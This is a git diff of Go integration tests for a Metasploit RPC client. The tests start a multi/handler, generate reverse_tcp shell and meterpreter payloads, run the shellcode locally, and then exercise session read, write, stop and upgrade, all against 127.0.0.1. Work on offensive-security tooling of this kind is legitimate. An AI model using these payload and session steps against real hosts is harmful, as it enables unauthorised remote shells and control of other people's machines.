@@ -15,19 +15,18 @@ import (
 	"project/internal/testsuite"
 )
 
-func testCreateShellSession(t *testing.T, msfrpc *MSFRPC, port string) {
-	testCreateSession(t, msfrpc, "shell", port)
+func testCreateShellSession(t *testing.T, msfrpc *MSFRPC, port string) uint64 {
+	return testCreateSession(t, msfrpc, "shell", port)
 }
 
-func testCreateMeterpreterSession(t *testing.T, msfrpc *MSFRPC, port string) {
-	testCreateSession(t, msfrpc, "meterpreter", port)
+func testCreateMeterpreterSession(t *testing.T, msfrpc *MSFRPC, port string) uint64 {
+	return testCreateSession(t, msfrpc, "meterpreter", port)
 }
 
-func testCreateSession(t *testing.T, msfrpc *MSFRPC, typ, port string) {
+func testCreateSession(t *testing.T, msfrpc *MSFRPC, typ, port string) uint64 {
 	ctx := context.Background()
 
 	// select payload
-	const exploit = "multi/handler"
 	opts := make(map[string]interface{})
 	switch runtime.GOOS {
 	case "windows":
@@ -51,20 +50,19 @@ func testCreateSession(t *testing.T, msfrpc *MSFRPC, typ, port string) {
 	default:
 		t.Skip("only support windows and linux")
 	}
-	opts["EXITFUNC"] = "thread"
+	// handler
 	opts["TARGET"] = 0
+	opts["ExitOnSession"] = false
+	// payload
 	opts["LHOST"] = "127.0.0.1"
 	opts["LPORT"] = port
+	opts["EXITFUNC"] = "thread"
 
 	// start handler
-	result, err := msfrpc.ModuleExecute(ctx, "exploit", exploit, opts)
+	mResult, err := msfrpc.ModuleExecute(ctx, "exploit", "multi/handler", opts)
 	require.NoError(t, err)
-	var ok bool
 	defer func() {
-		if ok {
-			return
-		}
-		jobID := strconv.FormatUint(result.JobID, 10)
+		jobID := strconv.FormatUint(mResult.JobID, 10)
 		err = msfrpc.JobStop(ctx, jobID)
 		require.NoError(t, err)
 	}()
@@ -76,21 +74,23 @@ func testCreateSession(t *testing.T, msfrpc *MSFRPC, typ, port string) {
 	payloadOpts.DataStore["EXITFUNC"] = "thread"
 	payloadOpts.DataStore["LHOST"] = "127.0.0.1"
 	payloadOpts.DataStore["LPORT"] = port
-	result, err = msfrpc.ModuleExecute(ctx, "payload", payload, payloadOpts)
+	pResult, err := msfrpc.ModuleExecute(ctx, "payload", payload, payloadOpts)
 	require.NoError(t, err)
-	sc := []byte(result.Payload)
+	sc := []byte(pResult.Payload)
 	t.Log("raw payload:", hex.EncodeToString(sc))
 
-	// execute shellcode and wait
+	// execute shellcode and wait some time
 	go func() { _ = shellcode.Execute("", sc) }()
 	time.Sleep(5 * time.Second)
 
 	// check session number
 	sessions, err := msfrpc.SessionList(ctx)
 	require.NoError(t, err)
-	if len(sessions) == 1 {
-		ok = true
+	require.Len(t, sessions, 1)
+	for id := range sessions {
+		return id
 	}
+	return 0
 }
 
 func TestMSFRPC_SessionList(t *testing.T) {
@@ -152,14 +152,10 @@ func TestMSFRPC_SessionStop(t *testing.T) {
 	ctx := context.Background()
 
 	t.Run("success", func(t *testing.T) {
-		testCreateShellSession(t, msfrpc, "55001")
+		id := testCreateShellSession(t, msfrpc, "55002")
 
-		sessions, err := msfrpc.SessionList(ctx)
+		err = msfrpc.SessionStop(ctx, id)
 		require.NoError(t, err)
-		for id := range sessions {
-			err = msfrpc.SessionStop(ctx, id)
-			require.NoError(t, err)
-		}
 	})
 
 	t.Run("invalid session id", func(t *testing.T) {
@@ -199,18 +195,14 @@ func TestMSFRPC_SessionRead(t *testing.T) {
 	ctx := context.Background()
 
 	t.Run("success", func(t *testing.T) {
-		testCreateShellSession(t, msfrpc, "55002")
+		id := testCreateShellSession(t, msfrpc, "55003")
 
-		sessions, err := msfrpc.SessionList(ctx)
+		result, err := msfrpc.SessionRead(ctx, id, 0)
 		require.NoError(t, err)
-		for id := range sessions {
-			result, err := msfrpc.SessionRead(ctx, id, 0)
-			require.NoError(t, err)
-			t.Log(result.Seq, result.Data)
+		t.Log(result.Seq, result.Data)
 
-			err = msfrpc.SessionStop(ctx, id)
-			require.NoError(t, err)
-		}
+		err = msfrpc.SessionStop(ctx, id)
+		require.NoError(t, err)
 	})
 
 	t.Run("invalid session id", func(t *testing.T) {
@@ -253,26 +245,22 @@ func TestMSFRPC_SessionWrite(t *testing.T) {
 	ctx := context.Background()
 
 	t.Run("success", func(t *testing.T) {
-		testCreateShellSession(t, msfrpc, "55002")
+		id := testCreateShellSession(t, msfrpc, "55004")
 
-		sessions, err := msfrpc.SessionList(ctx)
+		result, err := msfrpc.SessionRead(ctx, id, 0)
 		require.NoError(t, err)
-		for id := range sessions {
-			result, err := msfrpc.SessionRead(ctx, id, 0)
-			require.NoError(t, err)
-			t.Log(result.Seq, result.Data)
+		t.Log(result.Seq, result.Data)
 
-			n, err := msfrpc.SessionWrite(ctx, id, "whoami\r\n")
-			require.NoError(t, err)
-			require.Equal(t, uint64(8), n)
+		n, err := msfrpc.SessionWrite(ctx, id, "whoami\n")
+		require.NoError(t, err)
+		require.Equal(t, uint64(7), n)
 
-			result, err = msfrpc.SessionRead(ctx, id, 0)
-			require.NoError(t, err)
-			t.Log(result.Seq, result.Data)
+		result, err = msfrpc.SessionRead(ctx, id, 0)
+		require.NoError(t, err)
+		t.Log(result.Seq, result.Data)
 
-			err = msfrpc.SessionStop(ctx, id)
-			require.NoError(t, err)
-		}
+		err = msfrpc.SessionStop(ctx, id)
+		require.NoError(t, err)
 	})
 
 	t.Run("no data", func(t *testing.T) {
@@ -307,6 +295,154 @@ func TestMSFRPC_SessionWrite(t *testing.T) {
 			n, err := msfrpc.SessionWrite(ctx, id, data)
 			monkey.IsMonkeyError(t, err)
 			require.Zero(t, n)
+		})
+	})
+
+	msfrpc.Kill()
+	testsuite.IsDestroyed(t, msfrpc)
+}
+
+func TestMSFRPC_SessionUpgrade(t *testing.T) {
+	gm := testsuite.MarkGoroutines(t)
+	defer gm.Compare()
+
+	msfrpc, err := NewMSFRPC(testHost, testPort, testUsername, testPassword, nil)
+	require.NoError(t, err)
+	err = msfrpc.AuthLogin()
+	require.NoError(t, err)
+
+	ctx := context.Background()
+
+	t.Run("success", func(t *testing.T) {
+		id := testCreateShellSession(t, msfrpc, "55005")
+
+		const (
+			host = "127.0.0.1"
+			port = 55006
+		)
+		// select payload (not select architecture because the post module).
+		opts := make(map[string]interface{})
+		switch runtime.GOOS {
+		case "windows":
+			opts["PAYLOAD"] = "windows/meterpreter/reverse_tcp"
+		case "linux":
+			opts["PAYLOAD"] = "linux/x86/meterpreter/reverse_tcp"
+		default:
+			t.Skip("only support windows and linux")
+		}
+		// handler
+		opts["TARGET"] = 0
+		opts["ExitOnSession"] = false
+		// payload
+		opts["LHOST"] = host
+		opts["LPORT"] = port
+		opts["EXITFUNC"] = "thread"
+
+		// start handler
+		result, err := msfrpc.ModuleExecute(ctx, "exploit", "multi/handler", opts)
+		require.NoError(t, err)
+		defer func() {
+			jobID := strconv.FormatUint(result.JobID, 10)
+			err = msfrpc.JobStop(ctx, jobID)
+			require.NoError(t, err)
+		}()
+
+		_, err = msfrpc.SessionUpgrade(ctx, id, host, port, nil, 0)
+		require.NoError(t, err)
+
+		time.Sleep(5 * time.Second)
+
+		// list session
+		sessions, err := msfrpc.SessionList(ctx)
+		require.NoError(t, err)
+		for id, session := range sessions {
+			const format = "id: %d type: %s remote: %s\n"
+			t.Logf(format, id, session.Type, session.TunnelPeer)
+
+			err = msfrpc.SessionStop(ctx, id)
+			require.NoError(t, err)
+		}
+	})
+
+	const (
+		host = "127.0.0.1"
+		port = 55006
+		wait = 0
+	)
+
+	t.Run("invalid session id", func(t *testing.T) {
+		result, err := msfrpc.SessionUpgrade(ctx, 999, host, port, nil, wait)
+		require.EqualError(t, err, "invalid session id: 999")
+		require.Nil(t, result)
+	})
+
+	id := testCreateShellSession(t, msfrpc, "55006")
+	defer func() {
+		// kill session(need create a new msfrpc client)
+		msfrpc, err := NewMSFRPC(testHost, testPort, testUsername, testPassword, nil)
+		require.NoError(t, err)
+		err = msfrpc.AuthLogin()
+		require.NoError(t, err)
+
+		err = msfrpc.SessionStop(ctx, id)
+		require.NoError(t, err)
+
+		msfrpc.Kill()
+		testsuite.IsDestroyed(t, msfrpc)
+	}()
+
+	t.Run("cancel", func(t *testing.T) {
+		ctx, cancel := context.WithCancel(context.Background())
+		defer cancel()
+		go func() {
+			time.Sleep(3 * time.Second)
+			cancel()
+		}()
+
+		_, err = msfrpc.SessionUpgrade(ctx, id, host, port, nil, wait)
+		require.Error(t, err)
+	})
+
+	t.Run("cancel after write", func(t *testing.T) {
+		ctx, cancel := context.WithCancel(context.Background())
+		defer cancel()
+		go func() {
+			time.Sleep(7 * time.Second)
+			cancel()
+		}()
+
+		_, err = msfrpc.SessionUpgrade(ctx, id, host, port, nil, wait)
+		require.Error(t, err)
+	})
+
+	t.Run("invalid authentication token", func(t *testing.T) {
+		token := msfrpc.GetToken()
+		defer msfrpc.SetToken(token)
+		msfrpc.SetToken(testInvalidToken)
+
+		result, err := msfrpc.SessionUpgrade(ctx, id, host, port, nil, wait)
+		require.EqualError(t, err, ErrInvalidTokenFriendly)
+		require.Nil(t, result)
+	})
+
+	t.Run("failed to execute", func(t *testing.T) {
+		patch := func(interface{}, context.Context, string, string,
+			interface{}) (*ModuleExecuteResult, error) {
+			return nil, monkey.ErrMonkey
+		}
+		pg := monkey.PatchInstanceMethod(msfrpc, "ModuleExecute", patch)
+		defer pg.Unpatch()
+
+		result, err := msfrpc.SessionUpgrade(ctx, id, host, port, nil, wait)
+		monkey.IsMonkeyError(t, err)
+		require.Nil(t, result)
+	})
+
+	t.Run("failed to send", func(t *testing.T) {
+		testPatchSend(func() {
+			result, err := msfrpc.SessionUpgrade(ctx, id, host, port, nil, wait)
+			monkey.IsMonkeyError(t, err)
+			require.Nil(t, result)
 		})
 	})
 
